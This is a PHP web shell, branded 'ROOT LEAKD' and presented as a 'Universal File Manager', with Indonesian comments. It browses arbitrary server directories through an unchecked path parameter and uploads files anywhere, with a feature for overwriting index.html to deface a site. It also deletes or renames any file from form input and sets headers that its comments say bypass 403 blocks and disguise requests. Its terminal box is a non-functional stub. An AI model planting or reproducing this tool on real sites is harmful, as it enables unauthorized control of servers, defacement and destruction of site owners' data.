<?php
// Path otomatis berdasarkan lokasi file
$path = isset($_GET['path']) ? $_GET['path'] : dirname(__FILE__);

// Fungsi Upload File
if (isset($_FILES['upload'])) {
    $uploadedFile = $path . '/' . $_FILES['upload']['name'];
    move_uploaded_file($_FILES['upload']['tmp_name'], $uploadedFile);
    // Tebas index.html jika file diunggah
    if (basename($_FILES['upload']['name']) === 'index.html') {
        $indexPath = $path . '/index.html';
        if (file_exists($indexPath)) {
            unlink($indexPath);
        }
        rename($uploadedFile, $indexPath);
    }
}

// Fungsi Hapus File
if (isset($_POST['delete'])) {
    unlink($_POST['delete']);
}

// Fungsi Rename File
if (isset($_POST['rename'])) {
    rename($_POST['oldname'], $_POST['newname']);
}

// Menampilkan Daftar File dan Folder
$files = scandir($path);

// Cek jika ada header user-agent palsu
if (!isset($_SERVER['HTTP_USER_AGENT'])) {
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
}

// Mengubah header untuk melewati 403
header('User-Agent: ' . $_SERVER['HTTP_USER_AGENT']);
header('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8');
header('Accept-Language: en-US,en;q=0.9,id;q=0.8');
header('Accept-Encoding: gzip, deflate, br');
header('Connection: keep-alive');
header('Upgrade-Insecure-Requests: 1');
header('Origin: https://example.com');  // Coba Origin sah untuk menyembunyikan permintaan

// Coba mengirimkan header Referer yang sah untuk menghindari pembatasan
if (!isset($_SERVER['HTTP_REFERER'])) {
    $_SERVER['HTTP_REFERER'] = 'https://example.com';
}

// Menambahkan lebih banyak header untuk menyembunyikan asal permintaan
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

// Menampilkan halaman
?>
	
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Universal File Manager</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            color: #eee; 
            margin: 0; 
            padding: 0;
            background-color: #222; 
        }

        header { 
            display: flex;
            align-items: center;
            background: rgba(0, 0, 0, 0.6); 
            padding: 30px; /* Increased padding for more space */
            font-size: 8vw; /* Larger font size for "ROOT LEAKD" */
            color: #ff0000; 
            font-weight: bold;
            text-shadow: 3px 3px 5px rgba(0, 0, 0, 0.8), 0 0 15px #ff0000, 0 0 5px #ff0000;
            letter-spacing: 5px; /* Increased letter spacing */
        }

        header img {
            height: 15vw; /* Increased logo size */
            vertical-align: middle;
            margin-right: 30px; /* Increased space between logo and text */
        }

        .container { 
            padding: 20px; 
            max-width: 100%; /* Ensure container does not stretch beyond the screen width */
            box-sizing: border-box; /* Include padding in width calculation */
        }

        .form-container, .terminal {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .form-container input,
        .form-container button,
        .terminal textarea,
        .terminal button {
            padding: 10px;
            font-size: 14px;
            border-radius: 5px;
        }

        .form-container button,
        .terminal button {
            background: #61dafb; 
            border: none; 
            color: #222; 
            cursor: pointer; 
        }

        .form-container button:hover,
        .terminal button:hover {
            background: #21a1f1; 
        }

        .terminal {
            background: rgba(0, 0, 0, 0.7);
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            max-width: 100%; /* Full width for responsive layout */
            margin: auto;
        }

        .terminal textarea {
            width: 50%;
            height: 40px;
            background: #000;
            color: #0f0;
            border: none;
            resize: none;
        }

        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 20px; 
        }

        table, th, td { 
            border: 1px solid #555; 
        }

        th, td { 
            padding: 10px; 
            text-align: left; 
        }

        th { 
            background: #666; 
            color: #fff; 
        }

        td a { 
            color: #61dafb; 
            text-decoration: none; 
        }

        td a:hover { 
            text-decoration: underline; 
        }

        .action-buttons button {
            margin-right: 5px;
            padding: 5px 10px;
            background: #61dafb;
            border: none;
            color: #222;
            cursor: pointer;
            border-radius: 3px;
        }

        .action-buttons button:hover {
            background: #21a1f1;
        }

        .rename-form {
            display: none;
            margin-top: 5px;
        }

        /* Media Queries for responsiveness */
        @media (max-width: 768px) {
            header { 
                flex-direction: column; /* Stack header elements on small screens */
                text-align: center;
                font-size: 10vw; /* Adjust font size for small screens */
            }

            header img {
                height: 20vw; /* Adjust logo size for small screens */
            }

            .container {
                padding: 10px;
            }

            .form-container input,
            .form-container button,
            .terminal textarea,
            .terminal button {
                font-size: 16px; /* Slightly larger text for better readability */
            }

            .terminal textarea {
                height: 60px; /* Adjust terminal height */
            }
        }

        @media (max-width: 480px) {
            header { 
                font-size: 12vw; /* Even smaller font size for very small screens */
            }

            header img {
                height: 30vw; /* Larger logo for very small screens */
            }

            .form-container input,
            .form-container button,
            .terminal textarea,
            .terminal button {
                font-size: 18px; /* Increase font size for very small screens */
            }

            .terminal {
                max-width: 100%; /* Make terminal width flexible */
            }
        }
    </style>
    <script>
        function runCommand() {
            const command = document.getElementById("command-input").value;
            alert(`Executing: ${command}`);
        }

        function toggleRenameForm(index) {
            const form = document.getElementById(`rename-form-${index}`);
            form.style.display = form.style.display === "none" ? "block" : "none";
        }

        function editFile(index) {
            alert(`Edit functionality not implemented for item ${index}.`);
        }
    </script>
</head>
<body>
    <header>
        <img src="https://j.top4top.io/p_3439971es1.png" alt="Logo">
        ROOT LEAKD
    </header>
    <div class="container">
        <p>Current Directory: <strong><?php echo $path; ?></strong></p>
        
        <div class="form-container">
            <form method="POST" enctype="multipart/form-data">
                Upload File: 
                <input type="file" name="upload" required>
                <button type="submit">Upload</button>
            </form>
        </div>

        <div class="form-container">
            <form method="POST">
                Create Folder: 
                <input type="text" name="foldername" placeholder="Enter folder name" required>
                <button type="submit">Create</button>
            </form>
        </div>
        
        <div class="terminal">
            <p><strong>Terminal Command:</strong></p>
            <textarea id="command-input" placeholder="Masukkan perintah terminal di sini..."></textarea>
            <button onclick="runCommand()">Run Command</button>
        </div>

        <table>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Upload Time</th>
                <th>Actions</th>
            </tr>
            <?php foreach ($files as $index => $file): ?>
                <?php 
                    if ($file === '.' || $file === '..') continue; 
                    $filePath = $path . '/' . $file;
                    $fileSize = is_dir($filePath) ? '-' : filesize($filePath); 
                    $fileTime = date("Y-m-d H:i:s", filemtime($filePath));
                ?>
                <tr>
                    <td>
                        <?php if (is_dir($filePath)): ?>
                            <span style="font-size: 20px;">📁</span>
                            <a href="?path=<?php echo $filePath; ?>"><?php echo $file; ?></a>
                        <?php else: ?>
                            <span style="font-size: 20px;">📄</span>
                            <?php echo $file; ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $fileSize === '-' ? '-' : round($fileSize / 1024, 2) . ' KB'; ?></td>
                    <td><?php echo $fileTime; ?></td>
                    <td>
                        <div class="action-buttons">
                            <button onclick="toggleRenameForm('<?php echo $index; ?>')">Rename</button>
                            <form id="rename-form-<?php echo $index; ?>" class="rename-form" method="POST">
                                <input type="hidden" name="oldname" value="<?php echo $filePath; ?>">
                                <input type="text" name="newname" placeholder="New Name" required>
                                <button type="submit" name="rename">Save</button>
                            </form>
                            <button onclick="editFile('<?php echo $index; ?>')">Edit</button>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="file" value="<?php echo $filePath; ?>">
                                <button type="submit" name="delete" onclick="return confirm('Are you sure you want to delete this file?')">Delete</button>
                            </form>
                        </div>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>
</body>
</html>
